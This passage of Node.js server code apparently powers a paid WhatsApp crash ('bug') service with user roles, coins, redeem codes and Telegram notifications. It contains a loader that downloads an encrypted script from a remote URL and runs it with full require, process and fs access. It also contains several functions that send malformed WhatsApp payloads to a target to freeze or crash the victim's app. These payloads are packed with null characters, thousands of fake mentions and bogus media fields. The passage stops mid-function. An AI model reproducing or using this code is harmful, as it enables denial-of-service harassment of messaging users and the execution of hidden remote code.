        sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa menambah masa aktif maksimal 30 hari." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== ENDPOINT KHUSUS UNTUK REFRESH COINS =====
app.get("/refreshCoins", (req, res) => {
  const { key } = req.query;
  
  console.log("\n=== 💰 REFRESH COINS REQUEST ===");
  console.log("Key:", key);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("❌ Invalid key");
    return res.json({ valid: false, message: "Invalid key" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("❌ User not found");
    return res.json({ valid: false, message: "User not found" });
  }
  
  if (user.coins === undefined || user.coins === null) {
    user.coins = 100;
    saveDatabase(db);
  }
  
  console.log("✅ Coins untuk", user.username, ":", user.coins);
  console.log("================================\n");
  
  return res.json({
    valid: true,
    coins: user.coins,
    username: user.username,
    role: user.role || "member"
  });
});

// ===== ENDPOINT REDEEM CODE =====
app.get("/redeem", (req, res) => {
  const { key, code } = req.query;

  console.log(`[🎁 REDEEM] Request dari key: ${key}, code: ${code}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ REDEEM] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ REDEEM] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Load redeem codes
  const redeemCodes = loadRedeemCodes();
  const redeemData = redeemCodes.find(r => r.code === code.toUpperCase());

  if (!redeemData) {
    console.log("[❌ REDEEM] Invalid code");
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kode redeem tidak valid" 
    });
  }

  if (redeemData.used) {
    console.log("[❌ REDEEM] Code already used");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode sudah digunakan oleh ${redeemData.used_by} pada ${new Date(redeemData.used_at).toLocaleString("id-ID")}` 
    });
  }

  // Validasi role - hanya bisa redeem jika role sesuai atau lebih tinggi
  const roleHierarchy = {
    member: 1,
    reseller: 2,
    vip: 3,
    owner: 4
  };

  const userRole = user.role || "member";
  const codeRole = redeemData.role;

  if (roleHierarchy[userRole] < roleHierarchy[codeRole]) {
    console.log("[❌ REDEEM] Role not allowed");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode ini hanya untuk role ${codeRole.toUpperCase()} atau lebih tinggi. Role kamu: ${userRole.toUpperCase()}` 
    });
  }

  // Redeem successful - add coins
  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += redeemData.amount;
  saveDatabase(db);

  // Mark code as used
  redeemData.used = true;
  redeemData.used_by = user.username;
  redeemData.used_at = new Date().toISOString();
  saveRedeemCodes(redeemCodes);

  console.log(`[✅ REDEEM] ${user.username} redeemed ${code} (+${redeemData.amount} coins)`);

  // Log to file
  const logLine = `${new Date().toISOString()} | REDEEM | ${user.username} redeemed ${code} (${codeRole}) for ${redeemData.amount} coins | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // Notify to Telegram group
  sendToGroupsUtama(`🎁 *Kode Redeem Digunakan*

🎟 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
👤 User: ${user.username}
💰 Nilai: ${redeemData.amount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    amount: redeemData.amount,
    message: "Redeem berhasil!",
    coins_before: oldCoins,
    coins_after: user.coins
  });
});

// ===== ENDPOINT GIFT COIN (FIXED) =====
app.post("/giftCoin", (req, res) => {
  const { key, fromUsername, toUsername, amount } = req.body;

  console.log(`[🎁 GIFT DEBUG]`);
  console.log(`Key: ${key}`);
  console.log(`From: ${fromUsername}`);
  console.log(`To: ${toUsername}`);
  console.log(`Amount: ${amount}`);

  // ✅ VALIDASI KEY
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GIFT] Invalid key");
    return res.json({ 
      valid: false, 
      message: "Invalid session key" 
    });
  }

  // ✅ VALIDASI USERNAME PENGIRIM
  if (keyInfo.username.toLowerCase() !== fromUsername.toLowerCase()) {
    console.log("[❌ GIFT] Username mismatch");
    return res.json({ 
      valid: false, 
      message: "Username tidak sesuai dengan session" 
    });
  }

  const db = loadDatabase();
  const fromUser = db.find(u => u.username.toLowerCase() === fromUsername.toLowerCase());
  
  if (!fromUser) {
    console.log("[❌ GIFT] Sender not found");
    return res.json({ 
      valid: false, 
      message: "User pengirim tidak ditemukan" 
    });
  }

  // ✅ VALIDASI AMOUNT
  const giftAmount = parseInt(amount);
  if (!giftAmount || giftAmount <= 0) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Jumlah coin tidak valid" 
    });
  }

  // ✅ CEK SALDO
  if (fromUser.coins === undefined) fromUser.coins = 0;
  
  if (fromUser.coins < giftAmount) {
    console.log(`[❌ GIFT] Insufficient coins: ${fromUser.coins} < ${giftAmount}`);
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Coin tidak cukup! Saldo: ${fromUser.coins}, dibutuhkan: ${giftAmount}` 
    });
  }

  // ✅ CEK USER TUJUAN
  const toUser = db.find(u => u.username.toLowerCase() === toUsername.toLowerCase());
  
  if (!toUser) {
    console.log("[❌ GIFT] Recipient not found");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `User ${toUsername} tidak ditemukan` 
    });
  }

  // ✅ CEGAH KIRIM KE DIRI SENDIRI
  if (fromUsername.toLowerCase() === toUsername.toLowerCase()) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Tidak bisa mengirim gift ke diri sendiri" 
    });
  }

  // ✅ TRANSFER COINS
  if (toUser.coins === undefined) toUser.coins = 0;
  
  const fromOldCoins = fromUser.coins;
  const toOldCoins = toUser.coins;
  
  fromUser.coins -= giftAmount;
  toUser.coins += giftAmount;
  
  saveDatabase(db);

  console.log(`[✅ GIFT] ${fromUsername} sent ${giftAmount} coins to ${toUsername}`);

  // ✅ LOG TO FILE
  const logLine = `${new Date().toISOString()} | GIFT | ${fromUsername} → ${toUsername} | ${giftAmount} coins | ${fromUsername}: ${fromOldCoins} → ${fromUser.coins} | ${toUsername}: ${toOldCoins} → ${toUser.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // ✅ NOTIFY TO TELEGRAM
  sendToGroupsUtama(`🎁 *Gift Coin Terkirim*

📤 Dari: ${fromUsername}
📥 Ke: ${toUsername}
💰 Jumlah: ${giftAmount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}

Saldo ${fromUsername}: ${fromOldCoins} → ${fromUser.coins}
Saldo ${toUsername}: ${toOldCoins} → ${toUser.coins}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    message: "Gift berhasil dikirim!",
    from_coins_before: fromOldCoins,
    from_coins_after: fromUser.coins,
    to_coins_before: toOldCoins,
    to_coins_after: toUser.coins
  });
});

// ===== ENDPOINT REQUEST TOP UP DARI APLIKASI =====
app.post("/requestTopup", (req, res) => {
  const { key, amount } = req.body;

  console.log(`[💰 TOPUP REQUEST] Key: ${key}, Amount: ${amount}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ TOPUP] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ TOPUP] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Validasi amount
  if (!amount || amount < 25) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Minimal top up adalah 25 coin" 
    });
  }

  // Check if user has pending request
  const topupRequests = loadTopupRequests();
  const hasPending = topupRequests.find(r => r.username === user.username && r.status === "pending");

  if (hasPending) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kamu masih memiliki request top up yang pending. Tunggu hingga diproses." 
    });
  }

  // Create new request
  const requestId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const newRequest = {
    requestId,
    userId: null, // tidak ada telegram ID dari app
    username: user.username,
    amount: parseInt(amount),
    status: "pending",
    timestamp: new Date().toISOString(),
    source: "app" // penanda dari aplikasi
  };

  topupRequests.push(newRequest);
  saveTopupRequests(topupRequests);

  console.log(`[✅ TOPUP REQUEST] Created: ${requestId} for ${user.username}`);

  // KIRIM NOTIFIKASI KE OWNER ID SAJA (BUKAN KE GRUP)
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${requestId}` },
          { text: "❌ Reject", callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  bot.sendMessage(OWNER_ID, `🔔 *Top Up Request Baru (dari App)*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Jumlah: ${amount} coins
📱 Source: Mobile App
⏰ Waktu: ${new Date().toLocaleString("id-ID")}

Klik tombol di bawah untuk approve/reject:`, options);

  return res.json({
    valid: true,
    success: true,
    requestId,
    message: "Request top up berhasil dibuat! Silakan tunggu konfirmasi dari admin.",
    amount: parseInt(amount)
  });
});

// ===== ENDPOINT CEK STATUS TOP UP REQUEST =====
app.get("/checkTopupStatus", (req, res) => {
  const { key, requestId } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.username === user.username);

  if (!request) {
    return res.json({ 
      valid: true, 
      found: false, 
      message: "Request tidak ditemukan" 
    });
  }

  return res.json({
    valid: true,
    found: true,
    requestId: request.requestId,
    amount: request.amount,
    status: request.status, // pending, approved, rejected
    timestamp: request.timestamp,
    processedAt: request.processedAt || null,
    processedBy: request.processedBy || null
  });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const parts = data.trim().split('.');
    if (parts.length !== 2) {
      throw new Error("Invalid encrypted data format");
    }
    
    const [ivB64, encryptedB64] = parts;

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function superHatdNeested(sock, target) {
  const x = Array(1000).fill().map(() => ({
    body: { text: "\0" },
    footer: { text: ".📄." },
    header: {
      title: "\0",
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/562484555_3257530221051485_8736174800675391801_n.enc?ccb=11-4&oh=01_Q5Aa2wHOvqkgDgDpvtSEQVktZ4bVmP3hqvJW6vW0jMC_UT51lw&oe=6913C02B&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "/pCQ8LhNxLmebWrjMi5tDLzoJ/31dxx9984x7tsUuYY=",
        fileLength: "95578",
        height: 637,
        width: 735,
        mediaKey: "Kgc1e7Eh+Wn542W0qUQ57w+6j0z8oRJg6n7a2VZoLuw=",
        fileEncSha256: "uCvYU4by2leam5FL59mdMy9+UoRatRd3sX2yKX9fYOo=",
        directPath: "/v/t62.7118-24/562484555_3257530221051485_8736174800675391801_n.enc?ccb=11-4&oh=01_Q5Aa2wHOvqkgDgDpvtSEQVktZ4bVmP3hqvJW6vW0jMC_UT51lw&oe=6913C02B&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1760318502",
      },
      hasMediaAttachment: true,
    },
    nativeFlowMessage: {}
  }));

  const msg1 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `6285983729${i + 1}@s.whatsapp.net`
        ),
      },
      body: { text: ".!Linux £ex invisible", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
        version: 3,
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msg1.message } },
    { messageId: msg1.key.id, participant: { jid: target } }
  );

  const msg2 = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: { title: "" },
          body: { text: ".!Linux £ex invisible." + "\u0003".repeat(800000) },
          carouselMessage: { cards: x },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    msg2.message,
    { messageId: msg2.key.id, participant: { jid: target } }
  );

  const msg3 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "\u0000".repeat(1000), format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3,
          },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msg3.message } },
    { participant: { jid: target } }
  );

  const msg4 = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: { title: "!Linux £ex invisible" },
          body: { text: "!Linux £ex invisible" + "\0".repeat(900000) },
          nativeFlowMessage: {
            messageParamsJson: "Y",
            buttons: [
              { name: "cta_url", buttonParamsJson: "{}" },
              { name: "call_permission_request", buttonParamsJson: "{}" },
            ],
          },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    msg4.message,
    { participant: { jid: target } }
  );
}

async function iOSxTend(sock, target) {
  let VoidTeam = "DENIS NIH";
  let MyTeam = "ြ".repeat(1500);
  const PayCrash = {
    requestPaymentMessage: {
    }
  };

  await sock.relayMessage(target, PayCrash, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function YakuzaDrainPoint1(sock, jid) {
    const delay = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "assalamualaikum",
                    listType: 2,
                    buttonText: null,
                    sections: delay,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (jid) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_jid: "soker tai" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function LocaFreezHome(sock, target) {
   cosnole.log("Succes Send Freez Crash By Hika");

   const msg = {
      viewOnceMessage: {
         message: {
            interactiveMessage: {
               header: {
                  locationMessage: {
                     degressLatitude: -0,
                     degressLongitude: 0,
                     documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "999999999999",
                        pageCount: 1316134911,
                        fileLength: 9999999999,
                        height: 999999999,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "MynWha Hikamaru" + "ꦾ".repeat(60000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                     }
                  }
               },
                  nativeFlowMessage: {
                     buttons: [{ name: "form_message", buttonParamsJson: "\ubbbb" }, { name: "cta_call", buttonParamsJson: "ꦾ".repeat(55000) }, { name: "relog_call_crash", buttonParamsJson: "\u0000".repeat(0000) }]
                  },
              expiredSecury: [{ userJid: target,
                           mentionedJid: target,
                           participant: target,
                           quoted: null
                        }],
                        messageContextInfo: {
                           deviceListMetadata: {},
                           deviceListMetadataVersion: 1,
                           deviceListMetadataType: "Sectural_private"
                        },
                        contextInfo: {
                           externalAdReply: {
                              title: "List Kacung Gweh",
                              body: "ꦽ".repeat(38000),
                              mimeType: 'audio/mpeg',
                              caption: "ꦽ".repeat(35000),
                              showAdAttribution: true,
                              sourceUrl: "https://t.me//RyyNotDev2",
                              thumbnailUrl: ""
                           }
                      }
                 }
            }
       }
  };
  
   await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target },
      quoted: null,
      userJid: target,
      contextInfo: null
   });
   
  const msg1 = {
     imageMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
         fileLength: "9999999999",
         height: 99999999,
         width: 99999999,
         mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
         fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
         directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
         mediaKeyTimestamp: "999999999",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyIiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
         scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
         scanLengths: [3537, 10557, 1905, 2353],
         midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
         contextInfo: {
         mentionedJid: [
           "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
         stanzaId: "1234567890ABCDEF",
         quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
           }
         }
       }
     }
   };
   
  await sock.relayMessage(target, msg1, {
     messageId: null,
     participant: { jid: target }
  });
}

async function DelayInfinityV2Objective(sock, target) {
  console.log(chalk.red("Delay Infintiy Sending Succes"));

  const msg1 = {
     viewOnceMessage: {
         message: {
            interactiveResponseMessage: {
                contextInfo: {
                   remoteJid: " X ",
                   mentionedJid: Array.from(
                   { length: 1900 }, (_, y) => `6285798929${y + 1}@s.whatsapp.net`
                   ),
                    isForwarded: true,
                       fromMe: false,
                       forwardingScore: 9999,
                       forwardedNewsletterMessageInfo: {
                          newsletterJid: "120363422445860082@newsletter",
                          serverMessageId: 1,
                          newsletterName: "🩸"
                       }
                    },
                    body: {
                       text: "🩸",
                       format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                       name: "address_message",
                       paramsJson: "\x10".repeat(1000000),
                       version: 3
                    }
                }
            }
        }
    };
    
  await sock.relayMessage("status@broadcast", msg1, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const msg3 = {
     imageMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
         fileLength: "9999999999",
         height: 99999999,
         width: 99999999,
         mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
         fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
         directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
         mediaKeyTimestamp: "999999999",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyIiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
         scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
         scanLengths: [3537, 10557, 1905, 2353],
         midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
         contextInfo: {
         mentionedJid: [
           "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
